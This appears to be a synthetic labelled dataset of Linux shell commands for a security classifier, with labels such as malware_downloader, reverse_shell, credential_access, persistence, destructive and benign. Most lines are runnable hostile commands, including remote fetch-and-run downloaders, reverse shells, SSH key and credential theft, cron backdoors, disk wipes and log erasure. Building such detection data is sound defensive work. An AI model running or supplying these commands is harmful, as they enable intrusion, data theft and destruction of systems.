+{"text": "wget http://193.220.234.58:9999/files/a.sh -O /var/tmp/setup.sh && chmod 777 /root/x && /dev/shm/kaiten", "label": "malware_downloader", "template": "malware_downloader:38"}
+{"text": "rm -rf /var/log/*", "label": "defense_evasion", "template": "defense_evasion:13"}
+{"text": "Host: 192.18.182.7", "label": "benign", "template": "benign:31"}
+{"text": "cat /home/pi/.bash_history 2>/dev/null", "label": "credential_access", "template": "credential_access:27"}
+{"text": "cd /usr/bin; chmod 777 update.sh 2>&1", "label": "malware_execution", "template": "malware_execution:3"}
+{"text": "cd /home/ubuntu; ./kdevtmpfsi &", "label": "cryptominer", "template": "cryptominer:10"}
+{"text": "cd /etc; :(){ :|:& };: > /dev/null 2>&1", "label": "destructive", "template": "destructive:16"}
+{"text": "wget http://193.91.185.193/files/systemd-helper", "label": "malware_downloader", "template": "malware_downloader:19"}
+{"text": "cd /home/ubuntu; shred -u ~/.bash_history >/dev/null", "label": "defense_evasion", "template": "defense_evasion:22"}
+{"text": "cat kaiten | sh", "label": "malware_execution", "template": "malware_execution:42"}
+{"text": "wget -qO- http://host.mirror.ru:8080/files/kworkerds | sh", "label": "malware_downloader", "template": "malware_downloader:30"}
+{"text": "gobuster dir -u http://103.100.18.156 -w w.txt", "label": "network_scan", "template": "network_scan:25"}
+{"text": "cat /etc/shadow", "label": "credential_access", "template": "credential_access:0"}
+{"text": "/bin/busybox ps; /bin/busybox XDSBFXEZ", "label": "reconnaissance", "template": "reconnaissance:26"}
+{"text": "mkdir /root/.ssh", "label": "persistence", "template": "persistence:6"}
+{"text": "capsh --print", "label": "privilege_escalation", "template": "privilege_escalation:35"}
+{"text": "setenforce 0", "label": "defense_evasion", "template": "defense_evasion:28"}
+{"text": "passwd >/dev/null", "label": "persistence", "template": "persistence:29"}
+{"text": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://pkg.bin.icu/~u/x86_64; curl -O http://103.79.253.239/dl/k; chmod 777 arm7; sh dota3.tar.gz", "label": "malware_downloader", "template": "malware_downloader:35"}
+{"text": "cat /proc/cpuinfo | grep \"model name\" | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9}'", "label": "reconnaissance", "template": "reconnaissance:65"}
+{"text": "zt7", "label": "benign", "template": "benign:2"}
+{"text": "cd /tmp; cd /var/run; cd /tmp; echo d2dldCBodHRwOi8vMS4yLjMuNC94 | base64 -d | bash 2>/dev/null", "label": "malware_execution", "template": "malware_execution:37"}
+{"text": "curl -s http://dl-static.tk/files/a.sh -o /var/run/bins.sh", "label": "malware_downloader", "template": "malware_downloader:26"}
+{"text": "cd /var/tmp; chmod -R 000 /", "label": "destructive", "template": "destructive:21"}
+{"text": "mkfs.ext4 /dev/sda1", "label": "destructive", "template": "destructive:13"}
+{"text": "cd /var/tmp && sudo -u root /bin/sh 2>/dev/null", "label": "privilege_escalation", "template": "privilege_escalation:8"}
+{"text": "echo '/etc/gafgyt' >> ~/.profile", "label": "persistence", "template": "persistence:21"}
+{"text": "./arm7 & > /dev/null 2>&1", "label": "malware_execution", "template": "malware_execution:16"}
+{"text": "nslookup google.com 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:120"}
+{"text": "sh /tmp/sh4.sh", "label": "malware_execution", "template": "malware_execution:27"}
+{"text": "setsid /home/ubuntu/sshd &", "label": "malware_execution", "template": "malware_execution:24"}
+{"text": "rm -rf setup.sh; wget https://dlupdate.top/spc; chmod +x setup.sh; ./systemd-helper &", "label": "malware_downloader", "template": "malware_downloader:36"}
+{"text": "pkexec /bin/sh", "label": "privilege_escalation", "template": "privilege_escalation:27"}
+{"text": "tftp -g -r bot 45.10.33.33", "label": "malware_downloader", "template": "malware_downloader:42"}
+{"text": "/bin/busybox ftpget 107.208.168.51 xmr.sh payload.sh && sh clean.sh", "label": "malware_downloader", "template": "malware_downloader:17"}
+{"text": "cd /tmp; cd /var/run; cd /var/tmp; wget http://193.209.159.23/dl/kworkerds -O /mnt/arm && chmod 777 /dev/shm/setup.sh && /tmp/ld.sh 2>/dev/null", "label": "malware_downloader", "template": "malware_downloader:38"}
+{"text": "cat /etc/mysql/debian.cnf &", "label": "credential_access", "template": "credential_access:17"}
+{"text": "cd /root && wget http://23.39.239.1:8080/dl/k && chmod 777 kworkerds && ./gafgyt 2>/dev/null", "label": "malware_downloader", "template": "malware_downloader:33"}
+{"text": "cd /usr/bin && dmidecode -t system", "label": "reconnaissance", "template": "reconnaissance:124"}
+{"text": "nproc", "label": "reconnaissance", "template": "reconnaissance:70"}
+{"text": "head -c 0 > /tmp/yduryl_sign", "label": "reconnaissance", "template": "reconnaissance:14"}
+{"text": "php -r '$sock=fsockopen(\"103.6.9.109\",9001);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "label": "reverse_shell", "template": "reverse_shell:17"}
+{"text": "cd /usr/bin && echo DYRHHL", "label": "reconnaissance", "template": "reconnaissance:5"}
+{"text": "ncat -z 45.155.251.253 22-443", "label": "network_scan", "template": "network_scan:22"}
+{"text": "echo c > /proc/sysrq-trigger", "label": "destructive", "template": "destructive:27"}
+{"text": "/bin/busybox networkservice", "label": "reconnaissance", "template": "reconnaissance:109"}
+{"text": "tftp 178.59.251.202 -c get spc", "label": "malware_downloader", "template": "malware_downloader:43"}
+{"text": "cd /tmp && dmesg | tail 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:115"}
+{"text": "cp /bin/bash /usr/bin/.sh && chmod 4777 /dev/shm/.sh", "label": "privilege_escalation", "template": "privilege_escalation:16"}
+{"text": "cd /dev/shm && ./bot & &", "label": "malware_execution", "template": "malware_execution:47"}
+{"text": "./arm5 4", "label": "malware_execution", "template": "malware_execution:15"}
+{"text": "Content-Length: 3", "label": "benign", "template": "benign:7"}
+{"text": "ls /tmp/.X11-unix", "label": "reconnaissance", "template": "reconnaissance:104"}
+{"text": "cd /tmp; rm -rf /root/.bash_history", "label": "defense_evasion", "template": "defense_evasion:20"}
+{"text": "medusa -h 45.241.122.98 -u root -P p.txt -M ssh", "label": "network_scan", "template": "network_scan:13"}
+{"text": "wget https://cdn.pkg.tk:8000/cdn/bot && tar xzf setup.sh.tar.gz", "label": "malware_downloader", "template": "malware_downloader:50"}
+{"text": "/bin/busybox cat /proc/self/exe || cat /proc/self/exe", "label": "reconnaissance", "template": "reconnaissance:29"}
+{"text": "cd /tmp; cd /var/run; cd /etc; echo '*/10 * * * * /etc/ppc' >> /etc/crontab &", "label": "persistence", "template": "persistence:15"}
+{"text": "cd /tmp; cd /var/run; cd /tmp; crontab -l", "label": "reconnaissance", "template": "reconnaissance:94"}
+{"text": "sh -i >& /dev/udp/203.209.58.234/31337 0>&1", "label": "reverse_shell", "template": "reverse_shell:3"}
+{"text": "rm -rf .GWRLNFH 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:9"}
+{"text": "cd /tmp; cd /var/run; cd /var/run; sudo -i", "label": "privilege_escalation", "template": "privilege_escalation:0"}
+{"text": "cat > /etc/systemd/system/bins.sh.service << EOF", "label": "persistence", "template": "persistence:33"}
+{"text": "cat /etc/passwd", "label": "reconnaissance", "template": "reconnaissance:75"}
+{"text": "cat /dev/zero > /dev/sda", "label": "destructive", "template": "destructive:20"}
+{"text": "./xmrig --cpu-priority 5 -o gulf.moneroocean.stream:10128 2>/dev/null", "label": "cryptominer", "template": "cryptominer:22"}
+{"text": "cd /etc && su - 2>/dev/null", "label": "privilege_escalation", "template": "privilege_escalation:3"}
+{"text": "echo d2dldCBodHRwOi8vMS4yLjMuNC94 | base64 -d | bash", "label": "malware_execution", "template": "malware_execution:37"}
+{"text": "cd /tmp; cd /var/run; cd /root; nohup ./minerd -o stratum+tcp://gulf.moneroocean.stream:10128 &", "label": "cryptominer", "template": "cryptominer:5"}
+{"text": "grep -r stratum+tcp /tmp", "label": "cryptominer", "template": "cryptominer:26"}
+{"text": "cd /home/ubuntu; echo -ne \"\\x57\\xed\\x0a\\x09\\x51\\xff\\x5a\\x03\\x0f\\x3e\\x6e\\x49\\xce\\xff\\xa5\\x32\\x7f\\x39\\xf7\\xcf\\x0e\\xa8\\x7d\\x78\\x42\\x4f\\x99\\xe3\\x4d\\xe9\\x8e\\x23\\x98\\x06\\x2e\\x7d\\x6f\\x7d\\xd3\\x74\\xb8\\x22\\x90\\xf7\\x21\\x4e\\x89\\x7c\" >> x86", "label": "malware_downloader", "template": "malware_downloader:11"}
+{"text": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"193.43.100.190\",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "label": "reverse_shell", "template": "reverse_shell:14"}
+{"text": "./xmr-stak --config config.txt", "label": "cryptominer", "template": "cryptominer:8"}
+{"text": "echo \"0 * * * * wget -q -O- http://mirror-dl.site/x/payload.sh | bash\" >> /var/spool/cron/root", "label": "persistence", "template": "persistence:16"}
+{"text": "echo LOGGED >/dev/null", "label": "reconnaissance", "template": "reconnaissance:3"}
+{"text": "for i in $(seq 1 254); do ping -c1 192.168.1.$i & done", "label": "network_scan", "template": "network_scan:27"}
+{"text": "linuxshell", "label": "reconnaissance", "template": "reconnaissance:21"}
+{"text": "shell", "label": "reconnaissance", "template": "reconnaissance:20"}
+{"text": "cd /tmp; cd /var/run; cd /etc; echo \"root:Passw0rd123\" | chpasswd", "label": "persistence", "template": "persistence:26"}
+{"text": "yEzAF36Kp5bL6uvESSNd0URZhx9rIvbU8iKj=", "label": "benign", "template": "benign:14"}
+{"text": "cd /etc && lwp-download http://hostdl.xyz/dl/arm5 kaiten", "label": "malware_downloader", "template": "malware_downloader:45"}
+{"text": "ruby -rsocket -e'f=TCPSocket.open(\"107.99.152.25\",1337).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "label": "reverse_shell", "template": "reverse_shell:18"}
+{"text": "cd /tmp; cd /var/run; cd /var/run; nohup ./x86 & > /dev/null 2>&1", "label": "malware_execution", "template": "malware_execution:21"}
+{"text": "/bin/busybox rm -rf .PIOY .OXLR", "label": "reconnaissance", "template": "reconnaissance:49"}
+{"text": "busybox wget http://updatemirror.xyz/cdn/x86_64", "label": "malware_downloader", "template": "malware_downloader:39"}
+{"text": "lscpu &", "label": "reconnaissance", "template": "reconnaissance:69"}
+{"text": "cd /dev/shm; wipefs -a /dev/sda", "label": "destructive", "template": "destructive:18"}
+{"text": "iptables -F", "label": "defense_evasion", "template": "defense_evasion:27"}
+{"text": "/bin/busybox ps; /bin/busybox RLQDTH", "label": "reconnaissance", "template": "reconnaissance:26"}
+{"text": "scp ~/.ssh/id_rsa test@23.58.40.60:/tmp", "label": "credential_access", "template": "credential_access:33"}
+{"text": "tar czf /etc/k.tgz ~/.ssh", "label": "credential_access", "template": "credential_access:31"}
+{"text": "uname -s -v -n -r -m", "label": "reconnaissance", "template": "reconnaissance:52"}
+{"text": "pkexec /bin/sh &", "label": "privilege_escalation", "template": "privilege_escalation:27"}
+{"text": "cat /proc/cpuinfo | grep \"model name\" | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9}' >/dev/null", "label": "reconnaissance", "template": "reconnaissance:65"}
+{"text": "for pid in /proc/[0-9]*; do if grep -q deleted $pid/maps; then kill -9 ${pid##*/}; fi; done", "label": "defense_evasion", "template": "defense_evasion:1"}
+{"text": "echo /var/tmp/spc.so >> /etc/ld.so.preload", "label": "persistence", "template": "persistence:36"}
+{"text": "which ls", "label": "reconnaissance", "template": "reconnaissance:46"}
+{"text": "cat ~/.aws/credentials", "label": "credential_access", "template": "credential_access:10"}
+{"text": "cd /mnt && echo '#!/bin/sh' > .s 2>/dev/null", "label": "malware_downloader", "template": "malware_downloader:4"}
+{"text": "setsid nc -e /bin/sh 5.180.159.31 443", "label": "reverse_shell", "template": "reverse_shell:24"}
+{"text": "cd /home/ubuntu", "label": "benign", "template": "benign:40"}
+{"text": "touch /home/ubuntu/.test && rm /mnt/.test", "label": "reconnaissance", "template": "reconnaissance:108"}
+{"text": "top -bn1 | head -5", "label": "reconnaissance", "template": "reconnaissance:83"}
+{"text": "# Method 8: lvnrayj to stdout", "label": "benign", "template": "benign:16"}
+{"text": "To: <sip:tiy@hmwcowa>", "label": "benign", "template": "benign:5"}
+{"text": "echo '/tmp/sh4' > /etc/ld.so.preload", "label": "persistence", "template": "persistence:37"}
+{"text": "tar czf /home/ubuntu/b.tgz /root/.aws /root/.ssh", "label": "credential_access", "template": "credential_access:32"}
+{"text": "/bin/busybox IKGOBFXQ", "label": "reconnaissance", "template": "reconnaissance:25"}
+{"text": "true", "label": "benign", "template": "benign:67"}
+{"text": "echo '/root/systemd-helper &' >> /etc/rc.local", "label": "persistence", "template": "persistence:19"}
+{"text": "cd /usr/bin; rm -rf /etc /boot", "label": "destructive", "template": "destructive:4"}
+{"text": "echo 'done' >> .gtmbgfgk", "label": "malware_downloader", "template": "malware_downloader:5"}
+{"text": "chmod +x update.sh && ./update.sh", "label": "malware_execution", "template": "malware_execution:11"}
+{"text": "rm -rf /usr 2>/dev/null", "label": "destructive", "template": "destructive:7"}
+{"text": "df -h > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:71"}
+{"text": "w\\get; chmod +x init.sh; ./kaiten", "label": "malware_execution", "template": "malware_execution:48"}
+{"text": "dd if=/dev/urandom of=/dev/sda", "label": "destructive", "template": "destructive:10"}
+{"text": "busybox dd if=$SHELL bs=22 count=1||dd if=/proc/self/exe bs=22 count=1||while read i;do busybox echo -n $i;done</proc/self/exe||cat /proc/self/exe", "label": "reconnaissance", "template": "reconnaissance:30"}
+{"text": "cd /tmp && echo \"0 * * * * wget -q -O- http://mirror.dl.tk/~u/clean.sh | bash\" >> /var/spool/cron/root", "label": "persistence", "template": "persistence:16"}
+{"text": "echo DPJCUB", "label": "reconnaissance", "template": "reconnaissance:5"}
+{"text": "chmod 777 update.armv5l 2>&1", "label": "malware_execution", "template": "malware_execution:4"}
+{"text": "cat ~/.docker/config.json >/dev/null", "label": "credential_access", "template": "credential_access:14"}
+{"text": "cd /var/run; echo 'chmod +x .c && ./.c && break || chmod +x $a && ./$a && break' >> .s", "label": "malware_downloader", "template": "malware_downloader:0"}
+{"text": "sshpass -p root ssh admin@178.226.31.9", "label": "network_scan", "template": "network_scan:32"}
+{"text": "echo -e \"mb66\\nGBYFUFLH\\nUGBRPH\"|passwd|bash", "label": "persistence", "template": "persistence:1"}
+{"text": "sqlmap -u http://62.44.216.117/index.php?id=1", "label": "network_scan", "template": "network_scan:24"}
+{"text": "unset HISTFILE", "label": "defense_evasion", "template": "defense_evasion:7"}
+{"text": "truncate -s 0 /etc/passwd", "label": "destructive", "template": "destructive:25"}
+{"text": "cd /dev/shm && wget http://178.48.220.120/sshd", "label": "malware_downloader", "template": "malware_downloader:52"}
+{"text": "cat ~/.pgpass", "label": "credential_access", "template": "credential_access:12"}
+{"text": "cd /tmp; cd /var/run; cd /usr/bin; for pid in /proc/[0-9]*; do if grep -q deleted $pid/maps; then kill -9 ${pid##*/}; fi; done", "label": "defense_evasion", "template": "defense_evasion:1"}
+{"text": "python lazagne.py all", "label": "credential_access", "template": "credential_access:37"}
+{"text": "cd /tmp; cd /var/run; cd /var/tmp; ./systemd-helper 5", "label": "malware_execution", "template": "malware_execution:15"}
+{"text": "ls -lh $(which ls) > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:100"}
+{"text": "eval $(echo YmFzaCBpIHRlc3Q= | base64 -d) >/dev/null", "label": "malware_execution", "template": "malware_execution:38"}
+{"text": "cd /root; id; sudo -n -l", "label": "privilege_escalation", "template": "privilege_escalation:33"}
+{"text": "chattr -i /etc/passwd", "label": "defense_evasion", "template": "defense_evasion:35"}
+{"text": "cd /mnt && echo -en \"\\xf2\\x69\\xc2\\xe9\\xca\\xa2\\xfc\\x39\\xfa\\x50\\x9a\\x82\\xda\\xbc\\xd6\\xeb\\x06\\xca\\xa9\\x13\\x58\\x55\\x25\\x9b\\x2c\\xf8\\x43\\x19\\x7a\\xfa\\x32\\xd6\\xb2\\xa6\\x06\\xef\\x6f\\xcf\\x4e\\xf2\\x8b\\xe0\\xd1\\x51\\x21\\x8f\\xf2\\xc6\" > /dev/shm/bot &", "label": "malware_downloader", "template": "malware_downloader:9"}
+{"text": "cat ~/.kube/config", "label": "credential_access", "template": "credential_access:15"}
+{"text": "nc -z 45.6.220.43 22 2>/dev/null", "label": "network_scan", "template": "network_scan:21"}
+{"text": ">/var/run/.f && /bin/busybox chmod 777 /etc/.f && /usr/bin/.f && cd /home/ubuntu/; ", "label": "reconnaissance", "template": "reconnaissance:1"}
+{"text": "cd /tmp && rm -rf /opt /srv /var", "label": "destructive", "template": "destructive:32"}
+{"text": "cd /tmp; cd /var/run; cd /var/tmp; dash a.sh", "label": "malware_execution", "template": "malware_execution:29"}
+{"text": "file /bin/ls >/dev/null", "label": "reconnaissance", "template": "reconnaissance:112"}
+{"text": "cd /var/run && history -c && history -w", "label": "defense_evasion", "template": "defense_evasion:4"}
+{"text": "qwerty", "label": "benign", "template": "benign:26"}
+{"text": "masscan 103.64.123.100/16 -p80,443", "label": "network_scan", "template": "network_scan:5"}
+{"text": "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCUlIhVqtBTav9k2wTWaDCnbXSVEoZbY4g+lfsmRhYCTvZr82AwQhVqlDkdP2ssAn6yrh5BxEgr3tLHCFb46ogwACiUf0bmF8+Ci0KDuqvRkeLstGI8kzNIoQZoY5Yp== root@host\" >> /root/.ssh/authorized_keys", "label": "persistence", "template": "persistence:4"}
+{"text": "cd /mnt; nohup ./minerd -o stratum+tcp://gulf.moneroocean.stream:10128 &", "label": "cryptominer", "template": "cryptominer:5"}
+{"text": "echo 'done' >> .enskdej", "label": "malware_downloader", "template": "malware_downloader:5"}
+{"text": "(crontab -l; echo \"@reboot /home/ubuntu/systemd-helper\") | crontab -", "label": "persistence", "template": "persistence:14"}
+{"text": "wget -O x https://update.bin.club:9999/cdn/systemd-helper > /dev/null 2>&1", "label": "malware_downloader", "template": "malware_downloader:24"}
+{"text": "systemctl stop firewalld >/dev/null", "label": "defense_evasion", "template": "defense_evasion:24"}
+{"text": "echo \"it works\"", "label": "benign", "template": "benign:48"}
+{"text": "tar czf /etc/b.tgz /root/.aws /root/.ssh", "label": "credential_access", "template": "credential_access:32"}
+{"text": "uname -r; searchsploit linux kernel", "label": "privilege_escalation", "template": "privilege_escalation:34"}
+{"text": "nohup ./xmrig -o gulf.moneroocean.stream:10128 -u 4MG7jLQpCzWZDzoJJjTeyqs5qWTdn8MpBwELzYx7s4qTXvgXsY7F8VNSQ2o9mgcBEEdc90oUtWPpgAoYDcxN7ijVpyA51yY -k --tls &", "label": "cryptominer", "template": "cryptominer:2"}
+{"text": "usermod -aG sudo ubuntu 2>/dev/null", "label": "persistence", "template": "persistence:28"}
+{"text": "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcw31uEVYcK/Jv49W53wghnMeO8eXzcsJQi4D7bi5pGd08n+XnzS64aV99crm+9jZ5L5ox/VCh5GK+TsJ3IRonNpoOjeB9VylfeRqgNrr1== ftp@host' >> ~/.ssh/authorized_keys 2>/dev/null", "label": "persistence", "template": "persistence:3"}
+{"text": "cd /mnt; cp /etc/shadow /dev/shm/s.txt >/dev/null", "label": "credential_access", "template": "credential_access:3"}
+{"text": "busybox nc 77.111.83.242 31337 -e /bin/sh", "label": "reverse_shell", "template": "reverse_shell:23"}
+{"text": "cd /var/run && wget -qO- icanhazip.com 2>/dev/null", "label": "reconnaissance", "template": "reconnaissance:117"}
+{"text": "./masscan --ports 22 185.231.196.43/8 &", "label": "network_scan", "template": "network_scan:9"}
+{"text": "Contact: <sip:jaeeo@ux>", "label": "benign", "template": "benign:6"}
+{"text": "./k & > /dev/null 2>&1", "label": "malware_execution", "template": "malware_execution:5"}
+{"text": "/bin/busybox echo > /etc/.AIJR && sh /home/ubuntu/.EXYP && cd /home/ubuntu/", "label": "reconnaissance", "template": "reconnaissance:34"}
+{"text": "busybox wget http://updatestatic.cn:8080/setup.sh", "label": "malware_downloader", "template": "malware_downloader:39"}
+{"text": "hydra -L users.txt -P passwords.txt 77.240.13.161 ssh", "label": "network_scan", "template": "network_scan:12"}
+{"text": "cd /tmp; cd /var/run; cd /mnt; ./masscan --ports 22 203.97.52.146/8 2>/dev/null", "label": "network_scan", "template": "network_scan:9"}
+{"text": "DAfHOyjkTA1m+vEpBHLGv31y8WB/XYJ2=", "label": "benign", "template": "benign:14"}
+{"text": "cat /etc/sudoers &", "label": "privilege_escalation", "template": "privilege_escalation:28"}
+{"text": "bash -c 'bash -i >& /dev/tcp/62.63.244.107/5555 0>&1'", "label": "reverse_shell", "template": "reverse_shell:2"}
+{"text": "arp -a", "label": "network_scan", "template": "network_scan:29"}
+{"text": "/bin/busybox tftp -g pkgcdn.online -r tftp.sh -l- | sh", "label": "malware_downloader", "template": "malware_downloader:15"}
+{"text": "rm -f ~/.bash_history", "label": "defense_evasion", "template": "defense_evasion:18"}
+{"text": "Call-ID: 20000", "label": "benign", "template": "benign:3"}
+{"text": "perl /etc/bins.sh.pl &", "label": "malware_execution", "template": "malware_execution:34"}
+{"text": "w", "label": "reconnaissance", "template": "reconnaissance:15"}
+{"text": "mkfs.xfs /dev/vda1", "label": "destructive", "template": "destructive:15"}
+{"text": "/bin/busybox ftpget 77.17.121.1 xmr.sh clean.sh && sh k", "label": "malware_downloader", "template": "malware_downloader:17"}
+{"text": "./setup.sh 7", "label": "malware_execution", "template": "malware_execution:15"}
+{"text": "chmod 755 /tmp/sshd", "label": "malware_execution", "template": "malware_execution:10"}
+{"text": "echo 'wget -q http://89.153.81.38:80/dl/clean.sh -O .c||curl -s http://45.61.189.248/bins/sh4 -o .c||tftp -g -l .c -r ld.sh 192.196.86.225' >> .s", "label": "malware_downloader", "template": "malware_downloader:6"}
+{"text": "cd /tmp; cd /var/run; cd /root; useradd -ou 0 -g 0 oracle", "label": "persistence", "template": "persistence:23"}
+{"text": "cd /root && tar xzf x86.tar.gz && cd xmr.sh && ./start &", "label": "malware_execution", "template": "malware_execution:39"}
+{"text": "chmod +x /etc/sh4", "label": "malware_execution", "template": "malware_execution:8"}
+{"text": "cat /proc/version &", "label": "reconnaissance", "template": "reconnaissance:78"}
+{"text": "chattr -ia /root/.ssh/authorized_keys", "label": "defense_evasion", "template": "defense_evasion:37"}
+{"text": "echo -e \"wkbqdeg27\\nVOBF\\nEWEZHJ\"|passwd|bash", "label": "persistence", "template": "persistence:1"}
+{"text": "chmod 4755 /var/tmp/tsunami", "label": "privilege_escalation", "template": "privilege_escalation:14"}
+{"text": "echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILEbcCQ2z2d6Es1eApk3TW/iUNwc/C3KzKM/c4fhN2WpdtpCw6hWehfz6k2IvNWe2NbnkYE/5SslV35fvvKubHFvLcsJG admin@kali\" >> /root/.ssh/authorized_keys", "label": "persistence", "template": "persistence:4"}
+{"text": "cd /home/ubuntu && cat .env &", "label": "credential_access", "template": "credential_access:21"}
+{"text": "nc -e /bin/sh 45.228.81.223 6666", "label": "reverse_shell", "template": "reverse_shell:6"}
+{"text": "echo 'RRZIKR'", "label": "reconnaissance", "template": "reconnaissance:6"}
+{"text": "dig google.com", "label": "reconnaissance", "template": "reconnaissance:121"}
+{"text": "nuclei -u http://62.184.21.254", "label": "network_scan", "template": "network_scan:26"}
+{"text": "cd /tmp; cat /proc/1/cgroup", "label": "reconnaissance", "template": "reconnaissance:128"}
+{"text": "./minerd -a cryptonight -o stratum+tcp://pool.supportxmr.com:5555 -u 4BXs83YL8WAYcvWcAutx5UfPZgCZqUfYGa1eXHRWpWeUUMMCWb4G8LYbNP8TyEuCWCV39CgBk8GyLKkdA5Qbg9mSKVZCh88 -p x", "label": "cryptominer", "template": "cryptominer:4"}
+{"text": "nuclei -u http://192.251.3.173", "label": "network_scan", "template": "network_scan:26"}
+{"text": "chmod 777 xmr.sh 2>/dev/null", "label": "malware_execution", "template": "malware_execution:9"}
+{"text": "tftp; wget; /bin/busybox HBMN", "label": "reconnaissance", "template": "reconnaissance:45"}
+{"text": "cd /var/run && rm -rf /bin /sbin /lib", "label": "destructive", "template": "destructive:8"}
+{"text": "> /dev/sda", "label": "destructive", "template": "destructive:19"}
+{"text": "cd /etc && python lazagne.py all", "label": "credential_access", "template": "credential_access:37"}
+{"text": "tar xzf mips.tar.gz && cd ld.sh && ./start", "label": "malware_execution", "template": "malware_execution:39"}
+{"text": "/bin/busybox hostname REFSMB > /dev/null 2>&1", "label": "reconnaissance", "template": "reconnaissance:35"}
+{"text": "echo '/tmp/sshd' >> /etc/init.d/mips", "label": "persistence", "template": "persistence:22"}
+{"text": "ls -l /dev/shm", "label": "benign", "template": "benign:36"}
+{"text": "sh -i >& /dev/udp/89.35.96.24/9001 0>&1", "label": "reverse_shell", "template": "reverse_shell:3"}
+{"text": "wget -q http://203.215.32.207/bins/mpsl", "label": "malware_downloader", "template": "malware_downloader:20"}
+{"text": "export HISTFILESIZE=0 2>/dev/null", "label": "defense_evasion", "template": "defense_evasion:10"}
+{"text": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://stage.pkg.cn:81/~u/gafgyt; curl -O http://193.143.206.184/~u/networkservice; chmod 777 networkservice; sh mips", "label": "malware_downloader", "template": "malware_downloader:35"}
+{"text": "echo \"*/5 * * * * curl -s http://77.89.67.81/files/bins.sh | sh\" | crontab -", "label": "persistence", "template": "persistence:13"}
+{"text": "cd /etc; wget http://23.20.57.85/update.sh; chmod +x arm7; ./setup.sh", "label": "malware_downloader", "template": "malware_downloader:32"}
+{"text": "scp networkservice pi@141.104.187.190:/tmp/", "label": "network_scan", "template": "network_scan:18"}
+{"text": "cat bot.pub >> ~/.ssh/authorized_keys >/dev/null", "label": "persistence", "template": "persistence:10"}
+{"text": "ps aux", "label": "reconnaissance", "template": "reconnaissance:79"}
+{"text": "ls -la /mnt", "label": "reconnaissance", "template": "reconnaissance:103"}
+{"text": "rm -f /var/log/auth.log /var/log/secure", "label": "defense_evasion", "template": "defense_evasion:14"}
+{"text": "sqlmap -u http://212.46.184.110/index.php?id=1", "label": "network_scan", "template": "network_scan:24"}
+{"text": "nohup /tmp/x86_64 > /dev/null 2>&1 &", "label": "malware_execution", "template": "malware_execution:22"}
+{"text": "chattr +i /var/tmp/arm5", "label": "defense_evasion", "template": "defense_evasion:36"}
+{"text": "cd /root; unshadow /etc/passwd /etc/shadow > h.txt 2>/dev/null", "label": "credential_access", "template": "credential_access:4"}
+{"text": "echo $((1+1))", "label": "reconnaissance", "template": "reconnaissance:122"}
+{"text": "perl ld.sh.pl", "label": "malware_execution", "template": "malware_execution:33"}
+{"text": "setsid /root/mpsl & &", "label": "malware_execution", "template": "malware_execution:24"}
+{"text": "php -r '$sock=fsockopen(\"103.197.254.77\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", "label": "reverse_shell", "template": "reverse_shell:17"}
+{"text": "echo '/etc/x86_64' >> ~/.profile", "label": "persistence", "template": "persistence:21"}
+{"text": "Accept: */*", "label": "benign", "template": "benign:32"}
+{"text": "bash /tmp/systemd-helper.sh &", "label": "malware_execution", "template": "malware_execution:28"}
+{"text": "nmap -Pn -T4 192.235.56.225/16 &", "label": "network_scan", "template": "network_scan:3"}
+{"text": "echo OPSUZK_CHECK", "label": "reconnaissance", "template": "reconnaissance:36"}
+{"text": "sudo -s", "label": "privilege_escalation", "template": "privilege_escalation:31"}
+{"text": "/tmp/init.sh &", "label": "malware_execution", "template": "malware_execution:19"}
+{"text": "find / -perm -2000 -type f 2>/dev/null", "label": "privilege_escalation", "template": "privilege_escalation:12"}
+{"text": "usermod -aG sudo user", "label": "persistence", "template": "persistence:28"}
+{"text": "grep -ri password /var/www 2>/dev/null > /dev/null 2>&1", "label": "credential_access", "template": "credential_access:29"}
+{"text": "dd if=/dev/zero of=/dev/sda bs=1M", "label": "destructive", "template": "destructive:9"}
+{"text": "sh .lxgrqch", "label": "malware_execution", "template": "malware_execution:1"}
+{"text": "From: <sip:kmtgzytn@wpt>;tag=ukbartg", "label": "benign", "template": "benign:4"}
+{"text": "uptime &", "label": "reconnaissance", "template": "reconnaissance:58"}
+{"text": "cd /mnt && cat ~/.aws/credentials 2>/dev/null", "label": "credential_access", "template": "credential_access:10"}
+{"text": "shred -vfz -n 5 /dev/sda 2>/dev/null", "label": "destructive", "template": "destructive:17"}
+{"text": "cd /dev/shm && pkill xmrig >/dev/null", "label": "cryptominer", "template": "cryptominer:14"}
+{"text": "ls -l rkg_7 2>/dev/null || echo '0'", "label": "reconnaissance", "template": "reconnaissance:12"}
+{"text": "whoami &", "label": "reconnaissance", "template": "reconnaissance:54"}
+{"text": "wget -O arm7 http://bin-static.site/m68k", "label": "malware_downloader", "template": "malware_downloader:24"}
+{"text": "for i in $(seq 1 254); do ping -c1 192.168.1.$i & done &", "label": "network_scan", "template": "network_scan:27"}
+{"text": "totizgr uq", "label": "benign", "template": "benign:1"}
+{"text": "cd /root && find / -type f -delete", "label": "destructive", "template": "destructive:23"}
+{"text": "lastlog", "label": "reconnaissance", "template": "reconnaissance:62"}
+{"text": "echo STARTED", "label": "reconnaissance", "template": "reconnaissance:2"}
